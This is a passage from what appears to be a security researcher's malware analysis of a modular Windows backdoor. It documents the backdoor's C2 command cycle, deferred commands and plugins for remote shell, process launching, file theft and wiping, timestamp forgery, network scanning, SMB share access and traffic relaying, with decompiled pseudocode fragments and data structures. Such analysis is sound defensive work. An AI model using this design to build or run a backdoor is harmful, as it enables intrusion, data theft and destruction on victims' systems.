In case of errors, the connection to the C2 is reset and re-established according to the procedure described above in Section 6.2.
Below is an example of an empty command handler from the Processes plugin (see the corresponding section).

SerializedData *__fastcall Processes::EmptyCommand(
        ORCHESTRATOR *ctx,
        SerializedData *parameters,
        int *pStatus)
{
  int status; 
  SerializedData *operationResultContainer; 

  status = 0;
  operationResultContainer = ctx->MakeNewContainer(OPERATION_RESULT_CONTAINER);
  if ( !operationResultContainer )
    status = ERR_OUT_OF_MEMORY;
  if ( pStatus )
    *pStatus = status;
  return operationResultContainer;
}


Here is the minimum necessary set of actions that the command handler must perform:
1.	Create a container in which the results of command execution will be serialized. In this case, it does not contain any storage units.
2.	Write the operation execution status or error code to the variable pStatus.
3.	Return the container with the command execution results.
7. Deferred commands
The backdoor has an additional ability to periodically execute a set of additional commands, outside the main cycle of their reception and processing. Such commands are hardcoded in the backdoor configuration, and their composition can be changed only by changing the whole configuration.
A certain time interval is set for the execution of deferred commands, which is specified by the backdoor operator (commands with ID = 109 and 110 of the Management plugin, see the description below). If this interval is not set (equal to 0), deferred commands are not executed. Checking for this interval and calling of the deferred command handler occurs after execution of a successive command from C2 in the main cycle of command reception and processing.
If the time interval for deferred commands is not 0, an attempt is made to execute commands. In case of failure, the handler waits for some time (three seconds by default), and then attempts to execute the commands again until the time interval is exhausted or the commands are successfully executed.
In addition, the operator can set a specific start time for deferred commands (command with ID = 110 of the Management plugin), which can also be referred to as the "wake-up time." If this time is specified, the deferred command handler waits until the specified wake-up time comes and only then proceeds to execution. Accordingly, the whole cycle of receiving and processing commands from the C2 is suspended for the time of waiting.
A simplified listing of the deferred command handler is shown below:

__int64 __fastcall ExecuteScheduledTasks(ORCHESTRATOR *this, unsigned int scheduledCmdExecutionTimeInterval)
{
  ...
  config = this->configuration;
  commandsExecutionTimeFrame = scheduledCmdExecutionTimeInterval;
  sleepIntervalInSeconds = 0;
  wakeUpTime = 0i64;
  timeWhenExecutionBegun = time64(0i64);
  
  if ( GetItemDataCopyFromContainer(config, SLEEP_TIME_IN_SECONDS, 0i64, &sleepIntervalInSeconds, 4u) < 0  || sleepIntervalInSeconds > 7200 )
  {
    sleepIntervalInSeconds = 3;
  }
  
  if ( GetItemDataCopyFromContainer(config, WAKE_UP_TIME, 0i64, &wakeUpTime, 8u) > 0 && wakeUpTime )
  {
    while ( time64(0i64) < wakeUpTime )
    {
        Sleep(1000 * sleepIntervalInSeconds);
    }
    wakeUpTime = 0i64;
    ReplaceItem(config, WAKE_UP_TIME, 0, &wakeUpTime, 8u, 0i64);
  }
  
  while ( timeWhenExecutionBegun + commandsExecutionTimeFrame > time64(0i64) )
  {
    ...      
    if ( ExecuteScheduledCommands(this) >= 0 )
      return 4i64;
    Sleep(1000 * sleepIntervalInSeconds);
  }
  
  return 1i64;
}


The array of deferred commands is serialized in the backdoor configuration with the key 0xD0024. Each element of this array includes the following values:
Serialization key	Data unit description
0x30025	Command identifier
0xD0028	Command parameter array
0x30026	If this parameter is 0, this command is not executed
0x30027	If this parameter equals 1, execution of deferred commands is terminated
The results of execution of deferred commands are serialized in the array with the 0xD002A key. Each element of the array includes the following elements:
Serialization key	Data unit description
0x30025	Executed command identifier
0x4003B	Command execution termination time
0xE0002	Container with the command execution results
The results of the execution of deferred commands are sent to the C2 by a separate command with ID = 105. Once sent, the container with the results is released. If the number of entries in this container exceeds 1,000, the old entries are deleted.
8. Descriptions of plugins
In this section, we will examine the functionality of all the plugins used in the analyzed instances of the backdoor. The plugin names are based on their functionality and are not found in the code itself.
8.1. Management
Let’s take a look at the Management plugin, which has the identifier pluginId = 1. Its primary functionality is to manage the backdoor orchestrator. There are a total of 18 commands here, with the IDs from 100 to 117. The unique feature of these commands is that all the data handlers for them are obfuscated using the Themida virtual machine to complicate analysis of the orchestrator control logic.
•	Command with ID = 100 loads and registers the specified plugin. It takes the following parameters:
Parameter serialization key	Parameter value
0x30007	Plugin identifier
0x50065	Buffer with a PE module that implements the plugin’s functionality
0xC0066	Name of the plugin initialization function (exported by the PE module of the plugin)
The specified PE module is reflectively loaded into the address space of the backdoor process, after which the specified plugin initialization function is called. The newly loaded plugin is then registered in the orchestrator under its identifier.
•	Command with ID = 101 unloads the specified plugin. It takes the plugin identifier as a parameter (serialization key = 0×30007). When unloading the plugin, it waits for all asynchronous operations performed by the plugin to complete.
•	Command with ID = 102 loads the specified transport plugin. It takes the following parameters:
Parameter serialization key	Parameter value
0x30007	Transport plugin identifier
0x30014	Connection factory identifier (see the "Transport subsystem architecture" section)
0x50065	Buffer with a PE module that implements the plugin’s functionality
0xC0066	Name of the plugin initialization function (exported by the PE module of the plugin)
Similarly to the command with ID=100, the specified PE module is reflectively loaded into the address space of the backdoor process, and the plugin initialization function is called. The plugin is then registered in the specified connection factory under its identifier.
•	Command with ID = 103 unloads the specified network plugin, removing it from the specified factory. It takes the following parameters: network transport factory identifier (0×30014) and plugin identifier (0×30007).
•	Command with ID = 104 takes as input a connection factory identifier (serialization key 0×30014) and creates a new (empty) connection factory with the specified identifier.
•	Command with ID = 105 sends the results of scheduled command execution to the C2, along with detailed information about the current machine. The container with the result of the command contains the following entries:
Serialization key	Storage unit description
0x4007B	Constant that varies in different samples (for example, 0×846A9F5EA9D10C3C), possibly part of the build identifier
0x3007A	Constant that varies in different samples (for example, 0×780C2714), possibly part of the build identifier
0x30079	Constant that varies in different samples (for example, 0×03), possibly part of the build identifier
0xC0081	Computer name
0xC0082	User name
0xC0083	IP address of the local network adapter (as a string)
0x50085	MAC address of the local network adapter
0x50088	Information about the OS version in the form of the OSVERSIONINFOEXW structure
0x30086	Major OS version number
0x30087	Minor OS version number
0x8003A	Difference in seconds between local time and UTC time
•	Command with ID = 106 sends the current configuration of the backdoor to the C2.
•	Command with ID = 107 updates the backdoor configuration. The new configuration is specified in the command parameters (serialization key = 0xE001E). During command execution, it tests newly configured network connections to the C2. The test results for each network connection variant are sent to the C2, serialized as follows:
Serialization key	Storage unit description
0xC0034	Configuration string of the tested connection
0x80003	Result code of the connection attempt using the specified transport
•	Command with ID = 108 has an empty handler.
•	Command with ID = 109 sets the time interval during which a dedicated function will attempt to execute deferred/scheduled commands (parameter key = 0×30064). The function also stops these attempts upon successful execution of these commands. The time interval is specified in minutes. The command serializes the value of the set parameter (key = 0×30064) into the command result container. The specified time interval cannot exceed 180 days.
•	Command with ID = 110 sets the time interval for executing deferred commands (similarly to the command with ID = 109, the parameter key is 0×30064), and also sets the wake-up time in Unix timestamp format (parameter key = 0×40022). The wake-up time is calculated as the sum of start time of the specified command execution and the specified time interval for executing deferred commands. After the execution of the specified command is completed, the cycle of receiving and processing commands from the C2 is suspended until the wake-up time.
•	Command with ID = 111 sets the parameter with the key 0×30021 in the backdoor configuration, the purpose of which is unknown.
•	Command with ID = 112 sets the parameter with the key 0×30020 in the backdoor configuration, the purpose of which is unknown.
•	Command with ID = 113 adds new configurations of network transports for communication with the C2, specified in the command parameters (key = 0xC0034). During this, each of the specified configurations is tested by creating a test transport (transport type AUTH), which attempts to connect to the C2. Test results—a string with the network transport configuration (key = 0xC0034) and the result code of the connection attempt using the specified transport (key = 0×80003)—are sent to the C2 via the connection currently in use.
•	Command with ID = 114 obtains the identifiers of the current and parent processes, which it serializes into the command result container with keys 0×3008C and 0×3008D, respectively.
•	Command with ID = 115 stops the receiving and processing of commands from the C2 until the next backdoor launch. The constant "0×1" is serialized with key 0×3006B into the command result container.
•	Command with ID = 116 collects data on all current asynchronous operations, serialized in the following format:
Serialization key	Storage unit description
0x30090	Identifier of the thread performing the asynchronous operation
0x3003E	Identifier of the asynchronous operation in progress
0xC0091	Description of the asynchronous operation in progress
0x3003D	Operation status: started / in progress / completed
0x3003F	Identifier of the plugin that performs the operation
The array of received data for each asynchronous operation is serialized with key 0xD003C into the command result container.
•	Command with ID = 117 has an empty command handler.
8.2. Remote Shell
This plugin has pluginId = 5 and provides only two functions that implement the remote command line mechanism.
•	Command with ID = 200 starts a process with the command line specified in the parameters (serialization key = 0×C00C8). The result of this command’s execution is everything that the running process outputs to stdout and stderr, serialized with key 0×C0004, as well as the execution status of the operation or the error code that occurred when starting the process (key = 0×80003).
•	Command with ID = 201 launches a remote command line by executing cmd /c start /b  and redirecting stdin and stdout to the remote host. If the remote command line process is already running, the command redirects stdin and stdout of that process to the specified remote host. Command parameters:
Parameter serialization key	Parameter value
0x300CE	ID of the process whose stdin/stdout need to be redirected to the remote host
0xС00СD	Command line to start the new process whose stdin/stdout will be redirected to the remote host
0xС00СС	String of the connection configuration to the remote host (more details in the "Transport subsystem architecture" section)
0x300CA	If this parameter is non-zero, client authentication is required when establishing a connection to the remote host (see the description of the client and agent transports)
If the process ID specified in the parameters is 0, a new process with the specified command line is started. Otherwise, the command line is ignored.
8.3. Processes
This plugin has the identifier pluginId = 7 and is designed to work with processes. It implements the following commands:
•	Command with ID = 400 performs the same operations as the command with ID = 401 (see below) but using the IWbemServices interface. Also, there is a slight difference in the information collected about the running system processes. The command line with which the process was launched (serialization key = 0xC0064) is added to the information specified in the description of the command with ID = 401.
•	Command with ID = 401 retrieves information about each running process in the system. The collected array of data is serialized with key 0xD003C into the container. The number of processes whose information is collected in this container does not exceed 256. When the specified threshold is reached, the intermediate result is sent to the C2, after which the collection of information continues. If the information collection is completed, and the number of processes whose information is recorded in the container is less than 256, the container is sent to the C2 in the usual manner, along with the command execution result (see the "Command receiving and processing cycle" section). The information collected about each process is as follows:
Serialization key	Storage unit description
0x30066	Process ID
0x3006A	Parent process ID
0xC006B	Name of the executable file of the process in UTF-8 encoding
0x80065	Process session ID
0xA006C	Process creation time in Unix timestamp format
0xC006D	Domain of the user on whose behalf the process was created
0xC006E	User on whose behalf the process was created
0x3006F	Processor architecture ID of the current system
0x30070	Bit depth of the current system processor
The backdoor uses the following processor architecture identifiers:
Architecture name	Processor ID in the backdoor
X86_64	1
ARM, ALPHA	2
PowerPC	3
MIPS	4
SHX	6
IA32, IA64	7
Microsoft Intermediate Language	8
Neutral	9
•	Command with ID = 402 takes a process ID as a parameter (serialization key = 0×30066) and terminates the execution of the process with the specified ID.
•	Command with ID = 403 creates a process with the specified command line on behalf of the user who created the specified session (or the process with the specified ID). The parameter with key 0×3006A holds the ID of the parent process of the newly created process. The command takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	Command line of the process to be run
0x80065	ID of the session in which to run this process
0x30066	Process ID. The new process will be created on behalf of the user who created the process with the specified ID if the session ID is not specified (less than 0)
0x3006A	ID of the process that will be specified as the parent of the newly created process
As the result, the command returns serialized ID of the newly created process (serialization key = 0×30066).
•	Command with ID = 404 is empty and does not perform any substantive actions.
•	Command with ID = 405 performs an asynchronous operation specified in an external library (DLL). Command parameters:
Parameter serialization key	Parameter value
0x50069	Buffer with the DLL performing the asynchronous operation
0xC0067	Name of the function performing the asynchronous operation. Exported by the specified DLL.
0xC0064	String parameter passed to the function performing the asynchronous operation (presumably the description of the operation)
The command handler reflectively loads the specified DLL into the memory of the current backdoor process, calling the entry point (presumably DllMain) with fdwReason = DLL_PROCESS_ATTACH as a parameter. After loading, it performs an asynchronous operation by calling, in a separate thread, the exported DLL function whose name is specified in the command parameters. The code for performing this operation is provided below:

int __fastcall Processes::InvokeExternalAsyncOperation(EXTERNAL_MODULE_ASYNC_OP_CONTEXT *ctx)
{
  __int64 opDescription; 
  void (*externalAsyncOperation)(void); 

  operationDescription = ctx->operationDescription;
  externalAsyncOperation = ctx->externalAsyncOperation;
  if ( opDescription )
    (externalAsyncOperation)(0, 0, operationDescription, 0);
  else
    externalAsyncOperation();
  return 0;
}


Upon completion of the asynchronous operation, the DLL is unloaded from memory.
8.4. Filesystem
This plugin has the identifier pluginId = 9 and implements functions for working with the file system via the following commands:
•	Command with ID = 300 collects information about the specified file or directory. It takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	Path of the specified file or directory
0x30070	Maximum number of files or directories whose information will be included in the final result. By default, it is set to 1024
0x3007B	Flag regulating the output data format, hereinafter referred to as the format flag
0x3007E	Unknown parameter, not used when executing the command
If the path is not specified, it returns a list of logical disk names with information about their types, obtained through the API call GetDriveTypeA(). If the object with the specified path is a file, the command collects and serializes the following data:
Serialization key	Storage unit description
0x30067, or 0xB007C if the format flag is set	File attributes: whether it is a directory, read/write/execute permissions (the mode field of the _stat64 structure in the SYS\STAT.H header)
0xС006E	File owner account name
0xC007D	File owner account domain name
0x4006C	File size
0xA0069	File modification time in Unix timestamp format
0xA0068, included in the result if the format flag is set	Last file access time in Unix timestamp format
0xA006A, included in the result if the format flag is set	File creation time in Unix timestamp format
0xС0066	File name
The collected information is serialized into the container with key 0xD003C if the format flag is set, or with key 0xD006D otherwise.
If the specified file system object is a directory, the function obtains the above information for each file or subdirectory located in it (non-recursively). It should be noted that the procedure used to obtain the owner’s account name and file owner’s domain requires the SeBackupPrivilege privilege.
•	Command with ID = 301 can be used to send large files from an infected machine to the C2, as well as to track changes in files of interest to the backdoor operator. The command takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	File path
0x4006B	Offset inside the specified file
0x3007A	Unknown parameter, not used when executing the command
0x50071	MD5 hash of the part of the file which starts at byte zero and ends at specified offset
The command is executed as follows:
•	Calculate the MD5 hash of the file contents from byte zero to the specified offset.
•	If the calculated hash matches the specified one, send to the C2 information about the file along with its contents starting from the offset specified in the parameters. If the calculated hash differs from the specified one, send to the C2 the entire file contents along with its metadata.
Information about the file includes the following serialized data:
Serialization key	Storage unit description
0x4006B	Current offset inside the file, starting from which the data was read
0x4006С	File size
0xA006A	File creation time in Unix timestamp format
0xA0069	File modification time in Unix timestamp format
0xA0068	Last file access time in Unix timestamp format
0x80003	Status of the current operation (error code or 0 if successful)
•	Command with ID = 302 can be used to download large files from the C2 to an infected machine, or to synchronize changes between versions of the same file on the C2 and on the infected machine. The command takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	File path
0x30076	Size of the buffer that will be used to transfer the file contents
0x30067	Unknown parameter, not used when executing the command
The command is executed as follows:
•	Send to the C2 the file size (key = 0×4006B), the MD5 of the file contents (key = 0×50071), and the status of the file open operation (key = 0×80003).
•	Receive from the C2 the offset within the specific file (key = 0×4006B) where the data received from the C2 will start overwriting the file contents, and the size of this data (key = 0×40006C).


•	Command with ID = 303 can be used to send to the C2 the contents of a specific file or of all files residing directly in a specific directory (files in subdirectories are not processed). The command can be used when the operator needs to track changes made to the contents of a specific directory and send only modified or newly created files to the C2.
It takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	Path of the specific file system object (file or directory)
0x50072	Hash table containing data on the state of files (detailed below)
0xC0077	Mask of the files to be ignored during the command execution (in the format of the WinAPI function PathMatchSpec)
The structure containing file state data looks as follows:

typedef struct
{
    __int64 key;                 // Key calculated as the djb2 hash of the file path
    __int64 offsetInFile;        // Offset within the file
    __time64_t modificationTime; // File modification time
    int fileContentsMd5[4];      // MD5 of the file contents
} FILE_STATE;


The hash table of the specified structures describes the files that were previously sent to the C2. The structure fields reflect the file state from the last time the file was sent.
Please note that when calculating the specified key using the djb2 algorithm, the special characters " * ? > < : are replaced by the character _ and the character \ is replaced by /.
During command execution, the following actions are performed for each file from the specified directory:
1.	If the file path matches the mask specified in the parameters (key = 0xC0077), the file is ignored.
2.	The algorithm specified above is used to calculate the key based on the file path.
3.	Based on the calculated key, the hash table is searched for an entry that matches the specific file. If an entry cannot be found, the file is subsequently sent in its entirety.
4.	If the MD5 hash of the file contents and the modification date match the corresponding fields in the found hash table entry, the file contents starting with the specified offset are sent. Otherwise, the file is sent to the C2 in its entirety.
5.	The following serialized file information is sent to the C2:
Serialization key	Storage unit description
0xС0064	Full file path
0x4006C	File size
0x4006B	Offset to start reading data from the current file
0xA0069	File modification time
0x80003	Error code returned when trying to process the file, or 0 if successful
6.	Either the entire contents of the file or the contents starting at the specified offset (based on the conditions of steps 4–5) are sent to the C2.
Prior to sending the files to the C2, serialized metadata on execution of the current operation is also sent:
Serialization key	Storage unit description
0x4006C	Total size of the transmitted files
0x80003	Status of the operation (always equal to 0)
0x30074	Number of files whose contents will be transmitted
0x4006B	Total volume of data that will be transmitted by current command (this volume may be different than the cumulative size of files because some files may be transmitted only partially)
The workflow presented above and the scope of transmitted data are also retained if the command parameter is a file path.
•	Command with ID = 304 takes file path (key = 0xС0064) as input. It fills the first 0×10000000 bytes of the specific file with zeros if the file size is larger than 0×10000000 bytes. Otherwise, it completely fills the specific file with zeros.
•	Command with ID = 305 takes path of the original file and path of the modified file (key = 0xC0064) as input. It copies the creation time, last access time and last write time of the original file and sets them as the corresponding attributes of the modified file.
•	Command with ID = 306 takes directory path (key = 0xC0064) as input. It creates a directory with the specified path.
•	Command with ID = 307 deletes the specified files or directory. It takes the following parameters:
Parameter serialization key	Parameter value
0xC0064	File path, directory path, or mask in the format of the WinAPI function PathMatchSpec
0x30067	Flag; if 0, the preceding parameter is interpreted as a directory path, otherwise it is interpreted as a file name mask
If the object at the specified path is a file, it is simply deleted. If a directory resides at the specified path, the following occurs:
•	If no mask is specified, the function deletes the specified directory together with all its contents.
•	Otherwise, the files whose paths match the specified mask are recursively deleted from the directory. If the name of a subdirectory matches the mask, the subdirectory is completely deleted with all its contents.
The command execution result includes data on the number of files to be deleted and the number of files actually deleted. This data is serialized with key 0×30074.
•	Command with ID = 308 collects information about the specified directory. It takes a directory name (key = 0xC0064) as a parameter. It returns the total size of files residing in the specified directory, the total number of subdirectories, and the total number of files in the directory. The command execution result is a string serialized with key 0xC0004:

    ...
    GetDirectoryInfo(dirName, &totalFilesSize, &dirsNum, &filesNum);
    sprintf_s(Buffer, 0x1000ui64, "%lld bytes, %d dirs, %d files\n", totalFilesSize, dirsNum, filesNum);
    operationResult = ctx->AddOrReplaceItem(operationResult, OPERATION_RESULT_STRING, 0i64, Buffer, -1, &err);
    ...


•	Command with ID = 309 copies the specified directory. Command parameters:
Parameter serialization key	Parameter value
0xC0064	Source directory path or mask in the format of the WinAPI function PathMatchSpec
0xC0064	Target directory path
0x30067	Flag; if 0, the first parameter is interpreted as a directory path, otherwise it is interpreted as a file name mask
If the source directory path is specified by a mask, the files matching the specified mask are copied. The command execution result includes the total number of files to be copied and the total number of files actually copied. This data is serialized with key 0xC0004.
•	Command with ID = 310 moves the specified directory. The parameters, returned results, and workflow are analogous to the command with ID = 309.
•	Command with ID = 311 takes file path (0xC0064) as input. The command reads the file and sends its contents to the C2. If the file size does not exceed 4096 bytes, the command serializes the file contents (key = 0xC0004) into the command result container. Otherwise, it sends the file contents in parts after serializing them as follows:
Serialization key	Storage unit description
0xC0004	Next part of the file, with a size of no more than 4096 bytes
0x3000B	Data end flag. If set to 0, the current part of the file is the last part
•	Command with ID = 312 reads text files and sends them to the C2. The group of commands working with text files was likely implemented to send the results of other commands saved in these files to the C2. Command parameters:
Parameter serialization key	Parameter value
0xC0064	Text file path
0x30081	Number of strings to be read
0x30082	String length
If the number of strings to be read from the file is not zero, the function reads the specified number of strings from the file and sends them to С2 after dividing them into buffers of 4096 or less bytes and serializing them similarly to the command with ID=311. Otherwise, a string with the length specified in the command parameters but not more than 4096 bytes is read from the specified file and then serialized (key = 0xC0004) into the command result container.
•	Command with ID = 313 reads data starting from a specific string in a text file. Command parameters:
Parameter serialization key	Parameter value
0xC0064	Text file path
0x30081	Number of strings that must be skipped
0x30082	Initial offset within the file
0x30083	Flag indicating the count direction (0 means that the count starts from the end of the file, otherwise the count starts from the beginning of the file)
The command reads the contents of the text file beginning with the specified offset in the file and skipping the specified number of strings, and then sends the contents to the C2.
If the specified count direction flag is not zero, the initial offset is counted from the beginning of the file. In this case, the command then skips the specified number of strings (treating CRLF as line end) and sends the remaining part of the file to the C2.
If the specified count direction flag is zero, the initial offset is counted from the end of the file. In this case, the command skips the specified number of strings, read in the reverse direction from the current position toward the start of the file. Then the part of the file spanning from the resultant position to the end of the file is sent to the C2.
The file contents are serialized and sent to С2 similarly to the commands with IDs 311 and 312.
•	Command with ID = 314 implements an asynchronous operation to get a listing of the specified directory. The result is saved to a text file. Command parameters:
Parameter serialization key	Parameter value
0xC0064	Directory path
0xC0064	Name of the text file used to save the results
0x30074	Maximum object nesting depth
0x30083	Flag indicating the count direction (0 means that the count starts from the end of the file, otherwise the count starts from the beginning of the file)
For the specified directory, the command recursively collects the following information and saves it to the specified file:
•	Last write date (year, month, day, hour, and minute specified as a string in the format YYYYMMDDhhmm)
•	File size
•	File name
•	Object nesting depth relative to the original directory
Note that the function used to collect the specified information has the capability to exclude the names of files and directories from being processed. However, this option is not used in this command.
•	Command with ID = 315 archives the specified files. It is executed asynchronously. Command parameters:
Parameter serialization key	Parameter value
0xD006D	Array of paths of the files that must be archived
0x30074	Size of the array containing the paths of files, in bytes
The file paths are specified as an array of consecutive structures each describing a string. Structure format: . Files from the specified array are put into a consolidated ZIP archive whose path is defined by the last element of this array. The progress of the operation is written to a log file whose name has the following format: . When the operation starts, the string "begin " is written to the log file. When the next file is processed, its name is written to the log file. If the next object from the specified array is a directory, it is put into the archive recursively. If a file cannot be archived for some reason, the string "skipped " is added to the log file. The command execution result is a string serialized with key 0xC0004: "Zip  Dir(s), File(s) to ".
8.5. Netscan
This plugin has the identifier pluginId = 4 and provides the capability to get various network environment information. It implements a total of 8 commands, which are examined in detail below.
•	Command with ID = 2000 checks the availability of the remote host with the specified IP address and port by attempting to connect to it over the TCP protocol. Parameters:
Parameter serialization key	Parameter value
0xD006D	Remote host IPv4 address
0x30074	Remote host port
0x30067	Local port
0x30069	Connection timeout, in seconds
Depending on whether or not a connection was established, the command execution result is either the "SUCCESS" or "FAILED" string serialized with key 0xC0004.
•	Command with ID = 2001 performs an asynchronous operation that gets the MAC addresses for the specified list of IPv4 addresses. Command parameters:
Parameter serialization key	Parameter value
0x30074	Size of the structure containing command parameters
0xD006D	Structure containing command parameters
Command parameters are defined as a separate structure as shown below:

typedef struct
{
     int flags;
     unsigned int initialHostIpv4Addr;
     int hostsInfoSize;
     char outFilePath[1024];
     int waitTimeout;
     int localPort;
     int remotePort;
     char hostsInfo[];
} NETSCAN_OPERATION_PARAMETERS;


For each IPv4 address from the array specified in this structure, the command handler retrieves its corresponding MAC address. IP addresses are specified in the hostsInfo field as strings separated by the CR character. In this case, the DESIRED_HOSTS_AS_STRING_LIST (0x20) flag is set in the flags field.
If this flag is not set, IP addresses are specified by a range with an initial value (initialHostIpv4Addr) and the number of addresses (hostsInfoSize) whose information is required. Each successive address is obtained by adding 1 to the preceding address. The result is a buffer containing strings that look as follows: IP\tMAC\r\n\t\r\n. If the WRITE_RESULT_TO_FILE (0x10) flag is set in the flags field, this buffer is written to a text file whose path is specified in the outFilePath field of the NETSCAN_OPERATION_PARAMETERS structure. If the flag is not set, the buffer is serialized with key 0xC0004 into the command result container.
Likewise, if the GET_DESIRED_INFO_LOCALLY (0x40) flag is set in the flags field, the operation receives the local IP-to-MAC mapping table available on the host (via the API call GetIpNetTable). Otherwise, the necessary information is obtained by sending ARP requests.
•	Command with ID = 2002 takes the same parameters as the command with ID=2001. It implements an asynchronous operation that checks the availability of the specified network port (the remotePort field of the NETSCAN_OPERATION_PARAMETERS structure) on a set of network hosts specified by the list of IPv4 addresses. The list of IPv4 addresses is specified the same way as in the previous command. This results in a buffer containing strings that look as follows: IP:PORT\tSTATUS\r\n:\t\r\n. The result is saved the same way as in the command with ID=2001. The operating logic is nearly identical for both commands. The only difference is that the GET_DESIRED_INFO_LOCALLY (0×40) flag is not relevant for this command because the performed operation always involves network interaction with specified hosts.
•	Command with ID = 2003 takes the same parameters as the command with ID=2001. It implements an asynchronous operation that collects the following data for each IPv4 address from the list specified in the parameters:
o	— Host domain name (if available)
o	— delay: total time of packet transmission from the local machine to the specified network host and back (in milliseconds)
o	— ttl: time to live of a packet sent from the specified network host to the local machine
o	The delay and ttl values are obtained by sending an ICMP echo request to the specified network host. The delay is calculated as the difference between the time when the ICMP echo request is sent and the time when a response is received from the specified network host. The ttl value is taken from the corresponding IP packet header of the response to the ICMP echo request.
o	Note that the ICMP request is built using raw sockets. The contents of this ICMP echo request packet are not typical for the standard Windows ping utility because the ICMP packet data generated by this command is preceded by a timestamp, which is more typical for Linux systems. Aside from the timestamp, the ICMP echo request packet contains only the string !"#$%&’()*+’-./0123456789:;<=>?. This payload also differs from packets that are generated by the Windows ping utility. The command execution result is a buffer that for each specified IPv4 address has a string in the following format: "HOSTNAME\tIP\tTTL\tDELAY\r\n\t\t\tms\r\n". The operating logic of flags specified in the NETSCAN_OPERATION_PARAMETERS structure matches the handler of the command with ID=2002.
•	Command with ID = 2004 performs an asynchronous operation to collect information about all active TCP connections on the local machine. The command takes the serialized structure NETSCAN_OPERATION_PARAMETRS_SHORT (key = 0xD006D) and the size of the specified structure (key = 0×30074) as a parameter. The NETSCAN_OPERATION_PARAMETRS_SHORT structure is defined as follows:

typedef struct
{
     int flags;
     char outFilePath[256];
} NETSCAN_OPERATION_PARAMETERS;


The collected information includes the following:
•  Local host and port
•  Remote host and port
•  State of the TCP connection represented by a string from the following list: "CLOSED", "LISTEN", "SYN-SENT", "SYN-RECEIVED", "ESTABLISHED", "FIN-WAIT-1", "FIN-WAIT-2", "CLOSE-WAIT", "CLOSING", "LAST-ACK", "TIME-WAIT", "DELETE-TCB".
•  PID and name of the executable file of the process that owns the TCP connection.
The result is a buffer that for each found TCP connection has a string in the following format: TCP\t:\t:\t\t ". Similarly to the command with ID=2001, the WRITE_RESULT_TO_FILE (0×10) flag is used to determine whether to save the result to an external file or to the command result container.
•	Command with ID = 2005 — Is not available.
•	Command with ID = 2006 implements an asynchronous operation to collect information about specified network shares. The command takes the structure NETWORK_INFO_ENUM_SMB_SHARES_PARAM (key = 0xD006D) and the size of this structure (key = 0×30074) as a parameter. The NETWORK_INFO_ENUM_SMB_SHARES_PARAM structure is defined as follows:

typedef struct
{
    int flags;
    int initialHostIpv4Addr;
    int hostInfoTotalSize;
    char outFileName[1024]; 
    char username[256];
    char password[256];
    char hostsInfo[]; 
} NETWORK_INFO_ENUM_SMB_SHARES_PARAM;


Network shares are defined as a list of IPv4 addresses in the format used for similar lists in the commands with IDs 2001–2003.
The following actions are performed for each IPv4 address from the specified list:
1.	Check that port 139 or 445 is open on the target host. If not, the current address is skipped.
2.	If one of the specified ports is open, attempt to connect to the specified network resource over the SMB protocol by using the username and password from the corresponding fields of the NETWORK_INFO_ENUM_SMB_SHARES_PARAM structure.
3.	If the connection is successful, get a listing of all resources that can be accessed through the specified share. This listing is compiled as a list of strings.
The following text buffer is generated for each share:

-------------------------------------------------------\r\n
[+]\t\t\t\tAuth\t\r\n
\\\\ "" /u:""\r\n
\r\n
...
\r\n


The string containing information about the available network resource has the following format:

<'-' if there are files on the resource, otherwise 'A'>\t\t\t.


The specified information is gathered by calling the WinAPI function NetShareEnum.
The buffer containing the command execution result is saved similarly to the commands described above, depending on whether the WRITE_RESULT_TO_FILE (0×10) flag is set in the flags field of the NETWORK_INFO_ENUM_SMB_SHARES_PARAM structure.
•	Command with ID = 2007 (0×7D7) receives the serialized structure NETSCAN_SHARES_MANIPULATION_PARAMS (0xD006D) and its size (0×30074) as input. The structure is defined as follows:

typedef struct
{
    char localDeviceName[128];
    char resourceShareName[128];
    char domainName[64];
    char userName[64];
    char password[64];
    int  needToDeleteConnection;
    int  needToEnumConnections;
}
NETSCAN_SHARES_MANIPULATION_PARAMS;


This command performs the following operations:
•	If the needToEnumConnections field is not zero, the command receives a list of all active connections to network shares on the local machine and then serializes this list in textual form (key = 0xC0004) into the command result container. The data collection result looks as follows:

STATUS\tLOCAL\tREMOTE\r\n

...



The connection description string has the following format: \t\t


•	Or if the needToDeleteConnection field is not zero, the command deletes the existing connection to the network share specified by the localDeviceName field of the NETSCAN_SHARES_MANIPULATION_PARAMS structure.
•	Or if both of the above-mentioned parameters are zero, the command creates a connection using resourceShareName as the name of the shared resource and using the userName and password fields as the access credentials.
•	Command with ID = 2008 (0×7D8) performs the same actions as the command with ID = 2003.
8.6. Bridge
This plugin has the identifier pluginId = 5, which matches the ID of the Remote Shell plugin possibly due to inconsistent assignment of IDs to plugins. Bridge facilitates various types of proxy connections, serving as a relay node between other hosts, which normally are backdoor instances. This plugin implements the 3 commands described below.
Command with ID = 501
This function creates in a separate thread a client which serves as a relay node redirecting network traffic between two specified hosts. This activity can be carried out in two different modes, which we will provisionally designate as Mode 1 and Mode 2 and further examine below. This command accepts the following arguments:
•	Client authenticity validation flag (the NEED_TO_ENSURE_CLIENT_AUTHENCITY parameter for the configuration of the created connections), serialization key = 0×301F4.
•	Size of the intermediate buffer used to store transmitted data, serialization key = 0×301F5.
•	Connection mode: Mode 1 if the parameter value is zero, otherwise Mode 2, serialization key = 0×301FD.
•	Timeout value for closing the connection if there are no network events, serialization key = 0×30200.
•	Configuration string for the primary connection, serialization key = 0xC01F6.
The general workflow of the relay node (called "client" in this context) is as follows:
1.	The client connects to the first (primary) host using the configuration string specified in the parameters.
2.	Then the client waits for the command to establish a second connection with another (secondary) host. The configuration of the connection with the secondary host is defined directly in the command parameters.
3.	After establishing a connection, the primary host and the secondary host exchange data that is relayed by the client.
This process can be illustrated as follows:
 
With the proper server implementation, this functionality lets you set up data exchange between the backdoor and an operator—for example, following the scheme below by connecting to the auth server through a relay node:
 
Also, with the proper implementation of primary server functionality, this scenario can also be used to build flexible routes for transmitting data between the backdoor and an operator, as any backdoor instance with the Bridge module can function as a relay node and an auth server (this module was enabled by default in all analyzed samples). Please note that we do not have access to an actual instance of the primary server, so the example above illustrates only one of the potential use scenarios for the described functionality.
In Mode 1, the command connectCommand for establishing a connection with the secondary host has a size of 16 bytes and must meet the following conditions:
1.	connectCommand[0] == 501
2.	connectCommand[1] ^ connectCommand[1] ^ connectCommand[2] == 0
